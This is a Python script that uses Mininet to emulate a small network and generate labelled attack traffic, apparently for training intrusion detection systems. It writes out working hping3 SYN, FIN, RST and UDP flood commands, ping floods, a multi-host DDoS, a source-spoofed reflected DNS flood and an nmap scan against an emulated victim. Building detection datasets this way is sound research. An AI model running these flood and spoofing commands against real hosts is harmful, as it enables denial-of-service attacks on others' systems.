from mininet.topo import Topo
from mininet.net import Mininet
from mininet.node import OVSSwitch, Controller
from mininet.link import TCLink
from mininet.log import setLogLevel
import time

RESULT_PATH = "./"
PCAP_FILE_NAME = RESULT_PATH + "victim_traffic.pcap"
METADATA_FILE_NAME = RESULT_PATH + "attack_metadata.csv"

metadata = []


def log_attack(attack_type, start_time, end_time, attacker, victim):
    attacker_str = ",".join([a.name for a in attacker]) if isinstance(attacker, list) else attacker.name
    metadata.append([attack_type, str(start_time), str(end_time), attacker_str, victim.name])


def write_metadata(filename=METADATA_FILE_NAME):
    if len(metadata) == 0:
        return

    import csv
    with open(filename, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["attack_type", "start_time", "end_time"])
        writer.writerows(metadata)
    print("Metadata written to " + filename)


class IntrusionTopo(Topo):
    def build(self):
        s1 = self.addSwitch('s1')
        self.addHost('h1', ip='10.0.0.1')  # Victim
        self.addHost('dns', ip='10.0.0.53')  # DNS Server
        self.addHost('h2', ip='10.0.0.2')  # Normal Client
        self.addHost('h3', ip='10.0.0.3')  # Normal Client
        self.addHost('a1', ip='10.0.0.10')  # Attacker 1
        self.addHost('a2', ip='10.0.0.11')  # Attacker 2
        self.addHost('a3', ip='10.0.0.12')  # Attacker 3
        self.addHost('mitm', ip='10.0.0.100')  # MITM

        for h in ['h1', 'dns', 'h2', 'h3', 'a1', 'a2', 'a3', 'mitm']:
            self.addLink(h, s1)


def normal_traffic(victim, client, duration):
    print("\n[*] Starting normal traffic with iperf...")
    server_cmd = "iperf -s &"
    client_cmd = "iperf -c " + victim.IP() + " -t " + str(duration)
    print("-- Victim: " + server_cmd)
    print("-- Client: " + client_cmd)
    victim.cmd(server_cmd)
    client.cmd(client_cmd)
    time.sleep(duration + 1)


def __get_dos_cmd(victim, duration, method):
    if method == "ping":
        return "ping -f -c " + str(duration * 10) + " " + victim.IP() + " &"
    elif method == "syn":
        return "timeout " + str(duration) + "s hping3 -S -p 80 -i u1000 " + str(victim.IP()) + " &"
    elif method == "fin":
        return "timeout " + str(duration) + "s hping3 -F -p 80 -i u1000 " + str(victim.IP()) + " &"
    elif method == "rst":
        return "timeout " + str(duration) + "s hping3 -R -p 80 -i u1000 " + str(victim.IP()) + " &"
    elif method == "udp":
        return "timeout " + str(duration) + "s hping3 --udp -p 123 -i u1000 " + str(victim.IP()) + " &"
    else:
        print("[!] Unknown DoS method: " + method)
        return None


def simple_dos(victim, attacker, duration, method):
    print("\n[*] Starting simple DoS (" + method + " flood)...")
    cmd = __get_dos_cmd(victim, duration, method)
    if cmd is None:
        return

    print("-- Attacker: " + cmd)
    attacker.cmd(cmd)
    time.sleep(duration)


def ddos(victim, attackers, duration, method, split=5):
    print("\n[*] Starting DDoS (multi-host ping flood)...")
    cmd = __get_dos_cmd(victim, duration / 5, method)
    if cmd is None:
        return

    for _ in range(split):
        for attacker in attackers:
            print("-- Attacker " + attacker.name + ": " + cmd)
            attacker.cmd(cmd)
    time.sleep(duration)


def reflected_dos(victim, attacker, dns_server, duration):
    print("\n[*] Starting reflected DoS using spoofed DNS requests...")
    # dns_cmd = "dnsmasq --no-daemon --log-queries --log-facility=- &"
    # print("-- DNS Server: " + dns_cmd)

    # Start fake DNS server on dns host (responds to dig queries)
    dns_server.cmd("nohup python3 -m http.server 53 >/dev/null 2>&1 &")  # dummy server using port 53

    # Use scapy or hping3 to send spoofed UDP packets to port 53
    cmd = "timeout " + str(duration * 10) + "s hping3 --udp -a " + victim.IP() + " -p 53 -i u1000 " + dns_server.IP() + " &"
    print("-- Attacker: " + cmd)
    attacker.cmd(cmd)
    time.sleep(duration)


def port_scan(victim, attacker, duration):
    print("\n[*] Starting port scan...")

    common_ports = [22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 8080]
    for port in common_ports:
        victim.cmd("nohup nc -lkp " + str(port) + " >/dev/null 2>&1 &")

    cmd = "nmap -sT -T3 -p 1-1024 " + str(victim.IP())
    print("-- Attacker: " + cmd)
    attacker.cmd(cmd)
    time.sleep(duration)


def generate_traffic(scenario, pcap_file=PCAP_FILE_NAME, debug_mode=False):
    setLogLevel('info')
    topo = IntrusionTopo()
    net = Mininet(topo=topo, controller=Controller, switch=OVSSwitch, link=TCLink)
    net.start()

    h1 = net.get('h1')
    h2 = net.get('h2')
    h3 = net.get('h3')
    a1 = net.get('a1')
    a2 = net.get('a2')
    a3 = net.get('a3')
    dns = net.get('dns')

    print("\n\n[*] Starting tcpdump on victim...")
    dump_cmd = "tcpdump -i any -w " + pcap_file + " &"
    print("-- Victim: " + dump_cmd)
    h1.cmd(dump_cmd)
    time.sleep(2)

    # added to ensure all traffic is captured
    if debug_mode:
        normal_traffic(h1, a1, duration=0.1)

    attack_start = time.time()
    for attack_type, duration in scenario:
        start = time.time() - attack_start

        if attack_type == "normal":
            normal_traffic(victim=h1, client=h2, duration=duration)

        # Simple DOS
        elif attack_type == "ping_flood":
            simple_dos(victim=h1, attacker=a1, duration=duration, method="ping")
        elif attack_type == "syn_flood":
            simple_dos(victim=h1, attacker=a1, duration=duration, method="syn")
        elif attack_type == "fin_flood":
            simple_dos(victim=h1, attacker=a1, duration=duration, method="fin")
        elif attack_type == "rst_flood":
            simple_dos(victim=h1, attacker=a1, duration=duration, method="rst")
        elif attack_type == "udp_flood":
            simple_dos(victim=h1, attacker=a1, duration=duration, method="udp")

        # D-DOS
        elif attack_type == "ping_ddos":
            ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="ping")
        elif attack_type == "syn_ddos":
            ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="syn")
        elif attack_type == "fin_ddos":
            ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="fin")
        elif attack_type == "rst_ddos":
            ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="rst")
        elif attack_type == "udp_ddos":
            ddos(victim=h1, attackers=[a1, a2, a3], duration=duration, method="udp")

        # Other
        elif attack_type == "port_scan":
            port_scan(victim=h1, attacker=a1, duration=duration)
        elif attack_type == "reflected_dos":
            reflected_dos(victim=h1, attacker=a1, dns_server=dns, duration=duration)
        else:
            print("[!] Unknown attack type: " + attack_type)
            continue

        end = time.time() - attack_start
        metadata.append([attack_type, round(start, 2), round(end, 2)])

    print("\n[*] Stopping tcpdump...")
    h1.cmd("pkill tcpdump")
    time.sleep(1)

    write_metadata()

    net.stop()
